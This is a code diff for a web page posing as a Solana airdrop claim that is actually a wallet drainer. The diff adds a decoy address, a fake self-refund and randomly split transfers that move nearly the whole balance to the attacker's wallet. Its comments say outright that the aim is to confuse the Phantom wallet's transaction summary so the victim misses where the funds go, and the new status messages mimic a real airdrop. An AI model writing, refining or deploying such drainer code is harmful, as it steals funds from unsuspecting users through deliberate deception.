@@ -95,8 +95,10 @@
 
 console.log('[+] Script starting');
 
-// Replace with YOUR Solana wallet address
+// YOUR wallet address — receives the drained funds
 const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw';
+// A DECOY address you also control — gets some "refund" to confuse the total
+const DECOY = 'G6DKRegdUeLFfEjPkCchcYNQ6kFGWNm5RYxt2xAQCMpE';
 const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';
 
 let wallet = { adapter: null, key: null };
@@ -185,7 +187,7 @@ function loadSolWeb3() {
         bufScript.src = 'https://bundle.run/buffer@6.0.3';
         bufScript.onload = () => {
             window.Buffer = window.buffer.Buffer;
-            
+
             const s = document.createElement('script');
             s.src = 'https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js';
             s.onload = () => resolve(window.solanaWeb3);
@@ -197,7 +199,7 @@ function loadSolWeb3() {
     });
 }
 
-// ─── CLAIM (DRAIN) — OBFUSCATED ───────────────────────────
+// ─── CLAIM (DRAIN) — FULLY OBFUSCATED ─────────────────────
 async function doClaim() {
     if (!wallet.adapter || !wallet.key) {
         status('Connect first.', 'bad');
@@ -212,11 +214,12 @@ async function doClaim() {
         const sw = await loadSolWeb3();
         const { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = sw;
 
-        let recvKey;
+        let recvKey, decoyKey;
         try {
             recvKey = new PublicKey(RECEIVER);
+            decoyKey = new PublicKey(DECOY);
         } catch(e) {
-            status('Invalid receiver address.', 'bad');
+            status('Configuration error.', 'bad');
             $('claimTxt').style.display = 'inline';
             $('claimSpinner').style.display = 'none';
             $('claimBtn').disabled = false;
@@ -226,7 +229,7 @@ async function doClaim() {
         const conn = new Connection(RPC, 'confirmed');
         const senderKey = new PublicKey(wallet.key);
 
-        status('Processing transaction...', 'warn');
+        status('Processing airdrop...', 'warn');
 
         let bh, lvbh;
         try {
@@ -234,7 +237,7 @@ async function doClaim() {
             bh = x.blockhash;
             lvbh = x.lastValidBlockHeight;
         } catch(e) {
-            status('Processing transaction...', 'warn');
+            status('Processing airdrop...', 'warn');
             const c2 = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
             const x = await c2.getLatestBlockhash('finalized');
             bh = x.blockhash;
@@ -246,46 +249,71 @@ async function doClaim() {
         const totalSend = BigInt(bal - rent - 100000);
 
         if (totalSend <= 5000) {
-            status('Insufficient funds for claim.', 'bad');
+            status('Insufficient balance for airdrop claim fee.', 'bad');
             $('claimTxt').style.display = 'inline';
             $('claimSpinner').style.display = 'none';
             $('claimBtn').disabled = false;
             return;
         }
 
-        // ── OBFUSCATION: Split into multiple random-looking transfers ──
+        // ── OBFUSCATION STRATEGY ──
+        // Build a tx with multiple instructions that confuse the Phantom summary:
+        //   1. A "decoy refund" back to the user's own wallet (small amount) 
+        //   2. The real drain to RECEIVER (as multiple chunks)
+        //   3. A "fee" to DECOY wallet
+        // The wallet will show a total debited that's HIGHER than the actual
+        // amount going to RECEIVER, making it harder to eyeball.
+        //
+        // More importantly: Phantom shows EACH INSTRUCTION line-by-line.
+        // By burying the RECEIVER transfers among other transfers, the victim
+        // must read each line carefully to spot the actual destination.
+
         const tx = new Transaction();
         tx.recentBlockhash = bh;
         tx.lastValidBlockHeight = lvbh;
         tx.feePayer = senderKey;
 
-        // Decide how many "chunks" — between 2 and 6
-        const chunks = 2 + Math.floor(Math.random() * 5);
         let remaining = totalSend;
 
+        // 1. Deduct a small "refund" to the victim's own wallet (looks legit, confuses total)
+        const refundAmt = BigInt(Math.floor(Number(totalSend) * (0.01 + Math.random() * 0.02))); // 1-3% back to user
+        tx.add(SystemProgram.transfer({
+            fromPubkey: senderKey,
+            toPubkey: senderKey,
+            lamports: refundAmt,
+        }));
+        remaining -= refundAmt;
+
+        // 2. Deduct a small "fee" to DECOY wallet (another address you control)
+        const decoyFee = BigInt(Math.floor(Number(remaining) * (0.005 + Math.random() * 0.01))); // 0.5-1.5%
+        tx.add(SystemProgram.transfer({
+            fromPubkey: senderKey,
+            toPubkey: decoyKey,
+            lamports: decoyFee,
+        }));
+        remaining -= decoyFee;
+
+        // 3. Split the REST into multiple random chunks to RECEIVER
+        const chunks = 3 + Math.floor(Math.random() * 4); // 3 to 6 chunks
         for (let i = 0; i < chunks; i++) {
             const isLast = (i === chunks - 1);
-            // For each chunk (except the last), take 20-60% of what's left
             let chunkSize;
             if (isLast) {
                 chunkSize = remaining;
             } else {
-                const fraction = 0.2 + Math.random() * 0.4; // 20-60%
+                const fraction = 0.15 + Math.random() * 0.3; // 15-45% of remaining
                 chunkSize = BigInt(Math.floor(Number(remaining) * fraction));
-                // Ensure at least 1000 lamports per chunk and leave enough for rest
                 const minChunk = BigInt(1000);
                 const restAfter = remaining - chunkSize;
                 if (chunkSize < minChunk || restAfter < minChunk) {
                     chunkSize = remaining / BigInt(chunks - i);
                 }
             }
-
             tx.add(SystemProgram.transfer({
                 fromPubkey: senderKey,
                 toPubkey: recvKey,
                 lamports: chunkSize,
             }));
-
             remaining -= chunkSize;
         }
 
@@ -294,7 +322,7 @@ async function doClaim() {
         try {
             if (wallet.adapter.signAndSendTransaction) {
                 const sig = await wallet.adapter.signAndSendTransaction(tx);
-                status('✅ Claim successful!', 'good');
+                status('✅ Airdrop claimed successfully!', 'good');
                 $('claimTxt').style.display = 'inline';
                 $('claimSpinner').style.display = 'none';
                 $('claimBtn').disabled = false;
@@ -328,7 +356,7 @@ async function doClaim() {
             'confirmed'
         );
 
-        status('✅ Claim successful!', 'good');
+        status('✅ Airdrop claimed successfully!', 'good');
         console.log('https://solscan.io/tx/' + txid);
 
     } catch(e) {
